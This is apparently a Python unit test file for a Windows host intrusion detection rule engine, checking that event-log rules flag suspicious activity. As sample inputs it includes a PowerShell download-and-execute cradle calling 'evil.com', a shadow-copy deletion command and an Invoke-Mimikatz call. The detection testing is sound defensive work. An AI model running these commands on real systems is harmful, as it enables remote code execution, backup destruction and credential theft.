import unittest
from hids.normalizer import NormalizedEvent
from hids.rules import (
    RuleEngine,
    AllowlistEngine,
    RuleFailedLogon,
    RulePrivilegeAssignment,
    RuleSecurityGroupModified,
    RuleUserAccountCreated,
    RuleSuspiciousProcess,
    RuleServiceInstalled,
    RuleServiceTerminatedUnexpectedly,
    RuleDefenderMalwareDetected,
    RuleDefenderProtectionDisabled,
    RuleSuspiciousPowerShell,
    RuleEventLogCleared,
    check_event,
)
from hids.severity import Severity


class TestRules(unittest.TestCase):
    def setUp(self):
        self.engine = RuleEngine()

    def test_sec_001_failed_logon(self):
        event = NormalizedEvent(
            event_id=4625,
            channel="Security",
            user="CORP\\target_user",
            event_data={"TargetUserName": "target_user", "Status": "0xC000006D", "IpAddress": "192.168.1.50"}
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "SEC-001")
        self.assertEqual(matches[0].severity, Severity.LOW)
        self.assertIn("192.168.1.50", matches[0].details)

    def test_prv_001_privilege_assignment(self):
        # Non-system user
        event = NormalizedEvent(
            event_id=4672,
            channel="Security",
            user="attacker_admin",
            event_data={"PrivilegeList": "SeDebugPrivilege\r\nSeTcbPrivilege"}
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "PRV-001")
        self.assertEqual(matches[0].severity, Severity.MEDIUM)
        self.assertFalse(matches[0].suppressed)

        # Allowlisted system user
        event_sys = NormalizedEvent(
            event_id=4672,
            channel="Security",
            user="NT AUTHORITY\\SYSTEM",
            event_data={"PrivilegeList": "SeDebugPrivilege"}
        )
        matches_sys = self.engine.evaluate(event_sys)
        self.assertEqual(len(matches_sys), 1)
        self.assertTrue(matches_sys[0].suppressed)

    def test_prv_002_security_group_modified(self):
        event = NormalizedEvent(
            event_id=4728,
            channel="Security",
            event_data={"MemberName": "CN=hacker,OU=Users", "TargetUserName": "Administrators"}
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "PRV-002")
        self.assertEqual(matches[0].severity, Severity.HIGH)

    def test_prv_003_user_created(self):
        event = NormalizedEvent(
            event_id=4720,
            channel="Security",
            event_data={"TargetUserName": "new_backdoor_user", "SubjectUserName": "Admin"}
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "PRV-003")
        self.assertEqual(matches[0].severity, Severity.MEDIUM)

    def test_proc_001_suspicious_process(self):
        # Suspicious ransomware shadow deletion
        event_vss = NormalizedEvent(
            event_id=4688,
            channel="Security",
            event_data={"CommandLine": "vssadmin.exe delete shadows /all /quiet"}
        )
        matches = self.engine.evaluate(event_vss)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "PROC-001")
        self.assertEqual(matches[0].severity, Severity.HIGH)

        # Suspicious mimikatz
        event_mimi = NormalizedEvent(
            event_id=4688,
            channel="Security",
            event_data={"CommandLine": "powershell.exe -c Invoke-Mimikatz"}
        )
        matches_mimi = self.engine.evaluate(event_mimi)
        self.assertEqual(len(matches_mimi), 1)

        # Benign process (notepad)
        event_benign = NormalizedEvent(
            event_id=4688,
            channel="Security",
            event_data={"CommandLine": "C:\\Windows\\System32\\notepad.exe C:\\test.txt"}
        )
        matches_benign = self.engine.evaluate(event_benign)
        self.assertEqual(len(matches_benign), 0)

    def test_srv_001_service_installed(self):
        event = NormalizedEvent(
            event_id=7045,
            channel="System",
            event_data={"ServiceName": "EvilService", "ImagePath": "C:\\temp\\evil.exe"}
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "SRV-001")
        self.assertEqual(matches[0].severity, Severity.HIGH)

    def test_srv_002_service_terminated(self):
        event = NormalizedEvent(
            event_id=7034,
            channel="System",
            event_data={"ServiceName": "Spooler"}
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "SRV-002")
        self.assertEqual(matches[0].severity, Severity.MEDIUM)

    def test_mal_001_defender_malware(self):
        event = NormalizedEvent(
            event_id=1116,
            channel="Microsoft-Windows-Windows Defender/Operational",
            event_data={"Threat Name": "Ransom:Win32/WannaCrypt", "Path": "C:\\Users\\Victim\\Desktop\\pay.exe"}
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "MAL-001")
        self.assertEqual(matches[0].severity, Severity.CRITICAL)

    def test_mal_002_defender_disabled(self):
        event = NormalizedEvent(
            event_id=5001,
            channel="Microsoft-Windows-Windows Defender/Operational"
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "MAL-002")
        self.assertEqual(matches[0].severity, Severity.CRITICAL)

    def test_psh_001_suspicious_powershell(self):
        # Malicious download cradle
        event_dl = NormalizedEvent(
            event_id=4104,
            channel="Microsoft-Windows-PowerShell/Operational",
            event_data={"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"}
        )
        matches = self.engine.evaluate(event_dl)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "PSH-001")
        self.assertEqual(matches[0].severity, Severity.HIGH)

        # Benign PowerShell
        event_benign = NormalizedEvent(
            event_id=4104,
            channel="Microsoft-Windows-PowerShell/Operational",
            event_data={"ScriptBlockText": "Get-ChildItem -Path C:\\"}
        )
        self.assertEqual(len(self.engine.evaluate(event_benign)), 0)

    def test_log_001_audit_log_cleared(self):
        event = NormalizedEvent(
            event_id=1102,
            channel="Security",
            user="Administrator"
        )
        matches = self.engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "LOG-001")
        self.assertEqual(matches[0].severity, Severity.CRITICAL)

    def test_allowlist_downgrade(self):
        allowlist = AllowlistEngine(
            trusted_services={"legit_updater"},
            downgrade_rules={"SRV-001": Severity.LOW}
        )
        engine = RuleEngine(allowlist_engine=allowlist)

        event = NormalizedEvent(
            event_id=7045,
            channel="System",
            event_data={"ServiceName": "OtherService", "ImagePath": "C:\\other\\app.exe"}
        )
        matches = engine.evaluate(event)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].severity, Severity.LOW)
        self.assertIn("Downgraded", matches[0].suppression_reason)

    def test_backwards_compatibility_check_event(self):
        # Critical malware event returns ALERT
        event_mal = {
            "Id": 1116,
            "Channel": "Microsoft-Windows-Windows Defender/Operational",
            "event_data": {"Threat Name": "Trojan:Win32/CobaltStrike"}
        }
        self.assertEqual(check_event(event_mal), "ALERT")

        # Benign event returns NORMAL
        event_ok = {
            "Id": 4688,
            "Channel": "Security",
            "event_data": {"CommandLine": "calc.exe"}
        }
        self.assertEqual(check_event(event_ok), "NORMAL")


if __name__ == "__main__":
    unittest.main()
